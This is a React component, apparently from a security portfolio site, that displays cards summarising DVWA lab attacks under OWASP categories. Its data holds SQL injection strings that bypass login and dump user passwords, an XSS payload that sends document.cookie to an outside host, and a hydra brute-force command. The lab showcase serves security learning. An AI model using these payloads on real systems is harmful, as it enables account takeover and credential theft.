interface AttackCardProps {
  index: number
  icon: string
  title: string
  severity: 'Critical' | 'High' | 'Medium'
  definition: string
  payload: string
  payloadLabel: string
  result: string
  imagePath?: string
  imageCaption?: string
  tags: string[]
}

const severityColor: Record<string, string> = {
  Critical: 'text-red-400 border-red-500/30 bg-red-500/10',
  High:     'text-orange-400 border-orange-500/30 bg-orange-500/10',
  Medium:   'text-yellow-400 border-yellow-500/30 bg-yellow-500/10',
}

const AttackCard: React.FC<AttackCardProps> = ({
  index, icon, title, severity, definition, payload, payloadLabel, result, tags,
}) => (
  <div
    className="group relative rounded-2xl glass-card overflow-hidden transition-all duration-500 hover:-translate-y-2 hover:shadow-[0_20px_50px_rgba(0,0,0,0.5)]"
  >
    {/* Animated Border Glow */}
    <div className="absolute inset-x-0 top-0 h-1 bg-gradient-to-r from-transparent via-[#00ff41] to-transparent opacity-0 group-hover:opacity-100 transition-opacity duration-500" />
    
    {/* Card Background Accent */}
    <div className="absolute -right-8 -top-8 w-32 h-32 bg-[#00ff41]/5 rounded-full blur-3xl group-hover:bg-[#00ff41]/10 transition-colors duration-500" />

    <div className="p-8">
      {/* Header */}
      <div className="flex items-start justify-between mb-8">
        <div className="w-14 h-14 rounded-2xl bg-white/5 border border-white/10 flex items-center justify-center text-3xl transition-transform duration-500 group-hover:scale-110 group-hover:rotate-3">
          {icon}
        </div>
        <div className="flex flex-col items-end gap-2">
          <span className="font-mono text-4xl font-black text-white/5 select-none">{String(index).padStart(2, '0')}</span>
          <span className={`px-3 py-1 rounded-full border font-mono text-[10px] font-bold uppercase tracking-widest ${severityColor[severity]}`}>
            {severity}
          </span>
        </div>
      </div>

      <div className="space-y-6">
        <div>
          <h3 className="text-2xl font-bold text-white mb-2 group-hover:text-[#00ff41] transition-colors">{title}</h3>
          <div className="flex flex-wrap gap-2">
            {tags.map((tag) => (
              <span key={tag} className="text-[10px] font-mono text-slate-500 uppercase tracking-wider font-bold">
                #{tag.replace(/\s+/g, '')}
              </span>
            ))}
          </div>
        </div>

        <p className="text-sm text-slate-400 leading-relaxed font-medium line-clamp-3">
          {definition}
        </p>

        {/* Payload Box */}
        <div className="space-y-3">
          <div className="flex items-center justify-between">
            <span className="text-[10px] font-mono text-slate-500 uppercase tracking-widest font-bold">{payloadLabel}</span>
            <span className="text-[10px] font-mono text-[#00ff41]/50 uppercase font-bold tracking-tighter">Encrypted-Payload</span>
          </div>
          <div className="relative rounded-xl bg-black/60 border border-white/5 p-4 group-hover:border-[#00ff41]/30 transition-colors">
            <code className="font-mono text-xs text-[#00ff41] block whitespace-pre-wrap break-all leading-relaxed">
              {payload}
            </code>
          </div>
        </div>

        {/* Result */}
        <div className="p-4 rounded-xl bg-red-500/5 border border-red-500/10">
          <div className="flex gap-3">
            <span className="text-red-400 font-bold text-sm leading-none pt-0.5">!</span>
            <div>
              <span className="block text-[10px] font-mono text-red-400/60 uppercase tracking-widest font-bold mb-1">Breach Result</span>
              <p className="text-xs text-slate-400 leading-relaxed font-medium">{result}</p>
            </div>
          </div>
        </div>
      </div>
    </div>
  </div>
)

/* ─── Section ─────────────────────────────────────────────────── */
const attacks: AttackCardProps[] = [
  {
    index: 1,
    icon: '💉',
    title: 'SQL Injection',
    severity: 'Critical',
    definition:
      'The silent killer of databases. Manipulating application logic to bypass filters and execute arbitrary SQL commands directly against the core storage engine.',
    payload: "' OR '1'='1' --\n' UNION SELECT user,pass FROM users --",
    payloadLabel: 'Attack Vectors',
    result:
      'Full authentication bypass and complete database dump achieved via UNION-based extraction.',
    tags: ['A03:2021', 'Database', 'Auth Bypass'],
  },
  {
    index: 2,
    icon: '🕸️',
    title: 'XSS Injection',
    severity: 'High',
    definition:
      'Injecting malicious client-side scripts into trusted web pages. Executing arbitrary code in the user context to hijack sessions or exfiltrate sensitive cookies.',
    payload: '<script>fetch(`https://atk.io?c=${document.cookie}`)</script>',
    payloadLabel: 'Payload Pattern',
    result:
      'Session token exfiltration from document.cookie, leading to full administrative account takeover.',
    tags: ['A03:2021', 'Client Side', 'Session'],
  },
  {
    index: 3,
    icon: '🔨',
    title: 'Brute Force',
    severity: 'High',
    definition:
      'The systematic exhaustion of credential combinations. Exploiting weak entropy and lack of account lockout policies to reclaim lost access points.',
    payload: 'hydra -L users.txt -P rockyou.txt http-post-form "/dvwa/login.php..."',
    payloadLabel: 'Execution Command',
    result:
      'Administrator credentials recovered in < 180 seconds due to default credential usage.',
    tags: ['A07:2021', 'Credentials', 'Entropy'],
  },
]

const Attacks: React.FC = () => (
  <section id="attacks" className="py-32 relative overflow-hidden">
    {/* Section Flair */}
    <div className="absolute top-0 left-1/2 -translate-x-1/2 w-full max-w-4xl h-px bg-gradient-to-r from-transparent via-[#00ff41]/20 to-transparent" />
    
    <div className="max-w-7xl mx-auto px-6 sm:px-12 lg:px-16 relative z-10">
      {/* Section Header */}
      <div className="flex flex-col md:flex-row md:items-end justify-between gap-8 mb-20">
        <div className="space-y-4">
          <div className="inline-flex items-center gap-2 px-3 py-1 rounded-full border border-[#00ff41]/20 bg-[#00ff41]/5">
            <span className="font-mono text-[10px] text-[#00ff41] font-bold uppercase tracking-widest">A03 // Vulnerability Analysis</span>
          </div>
          <h2 className="text-4xl sm:text-5xl font-bold text-white tracking-tight leading-none">
            Attack <span className="text-[#00ff41]">Vectors</span>
          </h2>
        </div>
        <p className="text-slate-500 max-w-md text-sm font-medium leading-relaxed border-l border-white/5 pl-6">
          Systematic documentation of real-world exploitation techniques tested within 
          the DVWA laboratory environment. Each vector represents a critical security failure.
        </p>
      </div>

      {/* Cards Grid */}
      <div className="grid md:grid-cols-2 lg:grid-cols-3 gap-8">
        {attacks.map((attack) => (
          <AttackCard key={attack.title} {...attack} />
        ))}
      </div>

      {/* Security Note */}
      <div className="mt-16 glass rounded-2xl p-8 border border-[#00e5ff]/20 bg-[#00e5ff]/5 flex flex-col sm:flex-row items-center gap-6">
        <div className="w-16 h-16 rounded-xl bg-[#00e5ff]/10 flex items-center justify-center text-3xl font-bold text-[#00e5ff]">
          !
        </div>
        <div className="space-y-1 text-center sm:text-left">
          <h4 className="text-white font-bold text-lg">OWASP Top 10 Alignment</h4>
          <p className="text-sm text-slate-400 font-medium max-w-2xl leading-relaxed">
            All listed vectors are categorized according to industry-standard risk frameworks. 
            Demonstrations transition from <span className="text-[#00ff41] font-bold">Standard</span> to <span className="text-[#febc2e] font-bold">Advanced</span> bypass techniques.
          </p>
        </div>
        <div className="sm:ml-auto">
          <div className="px-4 py-2 rounded-lg bg-white/5 border border-white/10 text-[10px] font-mono text-slate-500 font-bold uppercase tracking-widest">
            Framework: v2021
          </div>
        </div>
      </div>
    </div>
  </section>
)

export default Attacks
